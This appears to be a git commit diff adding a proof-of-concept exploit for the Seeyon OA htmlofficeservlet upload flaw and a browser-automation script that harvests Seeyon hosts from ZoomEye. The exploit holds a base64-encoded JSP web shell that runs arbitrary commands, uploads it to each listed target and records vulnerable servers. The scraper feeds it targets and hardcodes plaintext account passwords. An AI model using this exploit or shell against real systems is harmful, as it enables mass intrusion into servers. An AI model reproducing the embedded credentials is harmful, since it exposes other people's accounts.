56c23e224655a2fee25d56880fef6837859aae60
L1nf3ng <nuaa_llf@126.com>
2019-07-02 22:10:27 +0800

    Add a poc for seeyon, and a search script through zoomeye.

--- POCs/seeyon.py
+++ POCs/seeyon.py
@@ -16,11 +16,11 @@ def send_payload(url):
  
     payload = "REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkTjFsaU40S1h3aVZHemZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpIHtTdHJpbmdCdWlsZGVyIGxpbmUgPSBuZXcgU3RyaW5nQnVpbGRlcigpO3RyeSB7UHJvY2VzcyBwcm8gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO0J1ZmZlcmVkUmVhZGVyIGJ1ZiA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocHJvLmdldElucHV0U3RyZWFtKCkpKTtTdHJpbmcgdGVtcCA9IG51bGw7d2hpbGUgKCh0ZW1wID0gYnVmLnJlYWRMaW5lKCkpICE9IG51bGwpIHtsaW5lLmFwcGVuZCh0ZW1wKyJcbiIpO31idWYuY2xvc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge2xpbmUuYXBwZW5kKGUuZ2V0TWVzc2FnZSgpKTt9cmV0dXJuIGxpbmUudG9TdHJpbmcoKTt9ICU+PCVpZigiYXNhc2QzMzQ0NSIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkmJiEiIi5lcXVhbHMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSl7b3V0LnByaW50bG4oIjxwcmU+IitleGN1dGVDbWQocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSArICI8L3ByZT4iKTt9ZWxzZXtvdXQucHJpbnRsbigiOi0pIik7fSU+NmU0ZjA0NWQ0Yjg1MDZiZjQ5MmFkYTdlMzM5MGQ3Y2U="
  
-    payload = base64.b64decode(payload)
+    payload1 = base64.b64decode(payload)
  
     try:
  
-        r = requests.post(url + '/seeyon/htmlofficeservlet', data=payload)
+        r = requests.post(url + '/seeyon/htmlofficeservlet', data=payload1)
  
         r = requests.get(
             url + '/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+echo+wangming')
@@ -56,7 +56,7 @@ def savePeopleInformation(url, queue):
  
     if newurl != 0:
  
-        fw = open('loophole.txt', 'a')
+        fw = open('../loophole.txt', 'a')
         fw.write(newurl + '\n')
         fw.close()
  
@@ -68,7 +68,7 @@ def main():
  
     queue = Manager().Queue()
  
-    fr = open('url.txt', 'r')
+    fr = open('../ip_list.txt', 'r')
  
     lines = fr.readlines()
  
@@ -94,6 +94,10 @@ def main():
  
             break
  
-if "__main__" == __name__:
+if __name__ == "__main__":
  
     main()
+
+
+# the different base64 function
+# [https://paper.seebug.org/964/]()
--- testWater2.py
+++ testWater2.py
@@ -10,26 +10,106 @@
 import asyncio
 from pyppeteer.launcher import  launch
 
-zoom_url = "https://www.zoomeye.org"
-# so I hard coded here
-username = "nuaa_llf@126.com"
-password = "123HjKl+"
+# a redirect url
+redirect_url = "https://api.weibo.com/oauth2/authorize?client_id=1496756796&response_type=code&redirect_uri=https://sso.telnet404.com/oauth/callback/weibo?service=https://www.zoomeye.org/login"
+zoom_url = 'https://www.zoomeye.org/searchResult?q=seeyon%20%2bcountry:%22CN%22&t=all'
+# I hard coded here, so what?
+weibo_username = "964997188@qq.com"
+weibo_password = "liqiuxuan"
+# TMD, you must click some buttons for a while
+click_delay_time = 500
+
 
 async def main():
-    browser = await launch(devtools= True, args=["--window-size=1366,850"])
+    browser = await launch(devtools= True, args=["--start-maximized"])
     tabs = await browser.pages()
     tab = tabs[0]
-    await tab.goto(zoom_url)
-#    buttons = await tab.xpath('//div[@class="header-login"]')
-#    inputs = await tab.xpath('//input[@type="text"]')
-    button = await tab.evaluate("""()=>{
-        var login = document.getElementsByClassName('header-login')[0];
-        return login;
-    }""")
+
+    # Login Part
+    await tab.goto(redirect_url)
+#    userIdButton = await tab.querySelector('input#userId')
+#    passWdButton = await tab.querySelector('input#passwd')
+#    await userIdButton.type(weibo_username)
+#    await passWdButton.type(weibo_password)
+
+    # 另一种写法
+    await tab.type('input#userId', weibo_username)
+    await tab.type('input#passwd', weibo_password)
+    asyncio.wait([await tab.click('a[action-type="submit"]',delay= 500),
+        await tab.waitForNavigation(waitUntil='load')])
+
+
+    # Search Part
+    tab2 = await browser.newPage()
+    await tab2.goto(zoom_url)
+#    searchText = await tab2.waitForXPath('//input[@type="text"]')
+#    await searchText.type('seeyon')
+#    await tab2.keyboard.down('Enter')
+
+    # record the navigation information:
+    await tab2.setViewport(dict(width=1200, height=900))
+    results, ips = [], []
+    page_num =20
+
+    while len(ips) ==0 :
+        await tab2.reload(waitUntil='load')
+        ips = await tab2.evaluate('''()=>{
+            var ips = new Array();
+            rooms = document.querySelectorAll('.search-result-item-title');
+            for( var x=0;x<rooms.length;x++){
+                if( !rooms[x].href.startsWith('https://www.zoomeye.org')){
+                    ips.push(rooms[x].href);
+                }
+            }
+            return ips;
+        }''')
+    results.extend(ips)
+
+    while page_num != 0:
+        nextButton = await tab2.waitForSelector('.ant-pagination-next')
+        await nextButton.click(delay= click_delay_time)
+        while len(ips) ==0:
+            beforeButton = await tab2.waitForSelector('.ant-pagination-prev')
+            await beforeButton.click()
+            nextButton = await tab2.waitForSelector('.ant-pagination-next')
+            await nextButton.click(delay=click_delay_time)
+            ips = await tab2.evaluate('''()=>{
+                var ips = new Array();
+                rooms = document.querySelectorAll('.search-result-item-title');
+                for( var x=0;x<rooms.length;x++){
+                    if( !rooms[x].href.startsWith('https://www.zoomeye.org')){
+                        ips.push(rooms[x].href);
+                    }
+                }
+                return ips;
+            }''')
+        results.extend(ips)
+        page_num -= 1
+    # the next page
+    s = '\n'.join(results)
+    with open('url.txt', 'w') as file:
+        file.write(s)
+
+    print(tab2.url)
+    """
+    await asyncio.gather(
+        tab.waitForNavigation(),
+        submitButton.click(),
+    )
+    await tab.evaluate('''()=>{
+        var login = document.querySelector('a[action-type="submit"]');
+        login.click();
+    }''')
+    status = await tab.waitForFunction('''()=>{
+        var login = document.querySelector('a[action-type="submit"]');
+        login.click();  
+    }''')
+
     if button is None:
-        buttons = await tab.xpath('//div[@class="header-login"]')
-        button = buttons[0]
+        button = await tab.waitForXPath('//div[@class="header-login"]')
     await button.click()
+    """
+
     await browser.close()
 
 if __name__ == "__main__":
